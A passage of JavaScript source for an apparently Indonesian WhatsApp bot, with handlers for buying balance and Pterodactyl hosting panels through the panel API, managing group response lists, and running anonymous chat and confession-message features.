rafatharcodereply("_Berhasil Mengganti Link Up Ke Channel✅_")
} else {
return rafatharcodereply(`*format salah*\nContoh: ${prefix+command} *Mana Link Up Nya ?*`)
}
break

case 'buysaldo':
case 'topups': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Masukkan nominal saldo yang ingin dibeli.\nContoh: ${prefix+command} 1500`);
const hargaPer1500Saldo = 1000;
const nominal = parseInt(args[0]);
if (isNaN(nominal) || nominal < 1500) return m.reply('Minimal pembelian 1500 saldo');
const totalLimit = (nominal / 1500) * hargaPer1500Saldo;
const limitSaatIni = cekLimit(m.sender, db_limit);
if (limitSaatIni < totalLimit) {
return m.reply(`Informasi Pembelian Saldo\n\nNominal saldo: ${nominal}\nHarga per 1500 saldo: ${toRupiah(hargaPer1500Saldo)} limit\nTotal limit yang dibutuhkan: ${toRupiah(totalLimit)} limit\n\nLimit kamu saat ini: ${toRupiah(limitSaatIni)}\n\nLimit kamu tidak cukup untuk melakukan pembelian.`);
}
addSaldo(m.sender, nominal, db_saldo);
minLimit(m.sender, totalLimit, db_limit);
const hargaPer1500SaldoFormatted = toRupiah(hargaPer1500Saldo);
const totalLimitFormatted = toRupiah(totalLimit);
const limitAkhirFormatted = toRupiah(cekLimit(m.sender, db_limit));
await m.reply(`🔔 Transaksi Berhasil! 🔔\n\n✨ Kamu berhasil membeli ${nominal} saldo. ✨\n\nRincian Pembelian:\n${nominal} saldo x Rp. ${hargaPer1500SaldoFormatted} (per 1500 saldo) = Rp. ${totalLimitFormatted} limit\n\n💵 Limit kamu sekarang: Rp. ${limitAkhirFormatted}`);
}
break;

case 'buy1gb': {
if (cekSaldo(m.sender, db_saldo) < 6000) return m.reply(`Saldo kamu kurang\n\nSaldo kamu Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}\nHarga panel 1GB: Rp. 6.000`)
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = `${global.eggs}`
let loc = `${global.locc}`
let memo = "1050"
let cpu = "30"
let disk = "1050"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang membuat server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panel ini baik-baik`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Buy Using Saldo`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Sukses membeli panel 1GB*

ID User: ${user.id}
ID Server: ${server.id}

Sisanya dikirim lewat PC`)
await sleep(1000)
m.reply(`Sukses membayar seharga Rp. 6.000`)
minSaldo(m.sender, 6000, db_saldo)
}
break

case 'buy2gb': {
if (cekSaldo(m.sender, db_saldo) < 7000) return m.reply(`Saldo kamu kurang\n\nSaldo kamu Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}\nHarga panel 2GB: Rp. 7.000`)
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = `${global.eggs}`
let loc = `${global.locc}`
let memo = "2050"
let cpu = "60"
let disk = "2050"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang membuat server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panel ini baik-baik`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Buy Using Saldo`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Sukses membeli panel 2GB*

ID User: ${user.id}
ID Server: ${server.id}

Sisanya dikirim lewat PC`)
await sleep(1000)
m.reply(`Sukses membayar seharga Rp. 7.000`)
minSaldo(m.sender, 7000, db_saldo)
}
break

case 'buy3gb': {
if (cekSaldo(m.sender, db_saldo) < 8000) return m.reply(`Saldo kamu kurang\n\nSaldo kamu Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}\nHarga panel 3GB: Rp. 8.000`)
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = `${global.eggs}`
let loc = `${global.locc}`
let memo = "3050"
let cpu = "120"
let disk = "3050"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang membuat server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panel ini baik-baik`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Buy Using Saldo`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Sukses membeli panel 3GB*

ID User: ${user.id}
ID Server: ${server.id}

Sisanya dikirim lewat PC`)
await sleep(1000)
m.reply(`Sukses membayar seharga Rp. 8.000`)
minSaldo(m.sender, 8000, db_saldo)
}
break

case 'buy4gb': {
if (cekSaldo(m.sender, db_saldo) < 9000) return m.reply(`Saldo kamu kurang\n\nSaldo kamu Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}\nHarga panel 4GB: Rp. 9.000`)
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = `${global.eggs}`
let loc = `${global.locc}`
let memo = "4050"
let cpu = "120"
let disk = "4050"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang membuat server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panel ini baik-baik`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Buy Using Saldo`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Sukses membeli panel 4GB*

ID User: ${user.id}
ID Server: ${server.id}

Sisanya dikirim lewat PC`)
await sleep(1000)
m.reply(`Sukses membayar seharga Rp. 9.000`)
minSaldo(m.sender, 9000, db_saldo)
}
break

case 'buy5gb': {
if (cekSaldo(m.sender, db_saldo) < 10000) return m.reply(`Saldo kamu kurang\n\nSaldo kamu Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}\nHarga panel 5GB: Rp. 10.000`)
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = `${global.eggs}`
let loc = `${global.locc}`
let memo = "5050"
let cpu = "120"
let disk = "5050"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang membuat server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panel ini baik-baik`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Buy Using Saldo`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Sukses membeli panel 5GB*

ID User: ${user.id}
ID Server: ${server.id}

Sisanya dikirim lewat PC`)
await sleep(1000)
m.reply(`Sukses membayar seharga Rp. 10.000`)
minSaldo(m.sender, 10000, db_saldo)
}
break

case 'list': {
if (db_respon_list.length === 0) return m.reply(`Belum ada list respon didalam database!`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Belum ada list respon didalam grup ini!`)
let teks = `Halo ${db.data.users[m.sender].nama}, Berikut adalah list respon digrup ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada Didalam list respon. Misal ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} Kepada Bot`
rafatharcode.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break

case 'addlist':
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${prefix+command} Key|respon\n\nContoh: ${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return m.reply(`List respon dengan key: ${args1}\nSudah ada digrup ini!`)
if (/image/.test(mime)) {
let media = await rafatharcode.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses addlist respon\nKey: ${args1}`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses addlist respon\nKey: ${args1}`)
}
break

case 'dellist':
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (db_respon_list.length === 0) return m.reply(`Belum ada list respon didalam database!`)
if (!text) return m.reply(`Gunakan dengan xara ${prefix+command} Key\n\nContoh: ${prefix+command} tes`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return m.reply(`List respon dengan key: ${q}\ntidak ada didalam grup ini!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
m.reply(`Sukses dellist respon dengan key: ${q}`)
break

case 'updatelist':
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${prefix+command} Key|respon\n\nContoh: ${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar digrup ini!`)
if (/image/.test(mime)) {
let media = await rafatharcode.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Berhasil update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Berhasil update respon list dengan key *${args1}*`)
}
break

// === Menfes Menu

case 'anonymous':
case 'anonymouschat': {
if (!isPc) return onlyPrivat()
m.reply(`Hai ${db.data.users[m.sender].nama} selamat datang di Anonymous chat!\n\nKetik ${prefix}start untuk memulai sesi chat`)
 }
break

case 'start':
case 'mulai': {
if (!isPc) return onlyPrivat()
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
m.reply(`Kamu masih berada di dalam sesi Anonymous!\n\n${prefix}leave untuk keluar dari sesi chat`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
rafatharcode.sendMessage(room.a, {text: `Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${prefix}skip untuk mencari partner lain\n${prefix}leave untuk menghentikan sesi chat`})
room.b = m.sender
room.state = 'CHATTING'
m.reply(`Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${prefix}skip untuk mencari partner lain\n${prefix}leave untuk menghentikan sesi chat`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
m.reply(`Menunggu partner...`)
}}
break

case 'leave':
case 'keluar': {
if (!isPc) return onlyPrivat()
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
m.reply(`Kamu sedang tidak berada di sesi Anonymous!\n\n${prefix}start untuk memulai sesi chat`)
return false
}
m.reply('Berhasil keluar dari Anonymous chat!')
let other = room.other(m.sender)
if (other) await rafatharcode.sendText(other, `Partner telah meninggalkan sesi Anonymous!`, m)
delete this.anonymous[room.id]
if (command === 'leave') 
break
}
break

case 'skip':
case 'next':
case 'lanjut': {
if (!isPc) return onlyPrivat()
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
m.reply(`Kamu sedang tidak berada di sesi Anonymous!\n\n${prefix}start untuk mencari partner`)
return false
}
let other = romeo.other(m.sender)
if (other) await rafatharcode.sendText(other, `Partner telah meninggalkan sesi Anonymous!`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
rafatharcode.sendMessage(room.a, {text: `Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${prefix}skip untuk mencari partner lain\n${prefix}leave untuk menghentikan sesi chat`})
room.b = m.sender
room.state = 'CHATTING'
m.reply(`Berhasil menemukan partner. Sekarang kamu dapat mengirim pesan!\n\n${prefix}skip untuk mencari partner lain\n${prefix}leave untuk menghentikan sesi chat`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
m.reply(`Menunggu partner...`)
}}
break

case 'confess': 
case 'menfess': {
this.menfes = this.menfes ? this.menfes : {}
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return m.reply('Kamu masih berada didalam sesi menfess!')
if (!isPc) return onlyPrivat()
if (!text) return m.reply(`Contoh: ${prefix+command} nama 628xxx Woy`)
if (!text.includes(' ')) return m.reply(`Contoh: ${prefix+command} nama 628xxx Woy`)
let [namaNya, nomorNya, pesanNya] = text.split` `
if (nomorNya.startsWith('0')) return m.reply(`Contoh: ${prefix+command} nama 628xxx Woy`)
if(isNaN(nomorNya)) return m.reply(`Contoh: ${prefix+command} nama 628xxx Woy`)
var yoi = `Dari: ${namaNya}\nPesan: ${pesanNya}\n\nKlik *Balasmenfes* untuk menerima menfess\nKlik *Tolakmenfess* untuk menolak menfess`
let id = m.sender
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
buton = `{\"display_text\":\"Balas Menfess\",\"id\":\"${prefix}balasmenfess\"}`
butoff = `{\"display_text\":\"Tolak Menfess\",\"id\":\"${prefix}tolakmenfess\"}`
quickreply2(nomorNya + '@s.whatsapp.net', `Hi, ada yang menfess nih buat kamu!`, buton, butoff, m)
m.reply('Pesan berhasil dikirim ke nomer tujuan! Moga dibales yaa...')
}
break

case 'balasconfess':
case 'balasmenfess': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return m.reply("Belum ada sesi menfess sebelumnya!")
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find.b = m.sender
find.state = 'CHATTING'
this.menfes[find.id] = {...find}
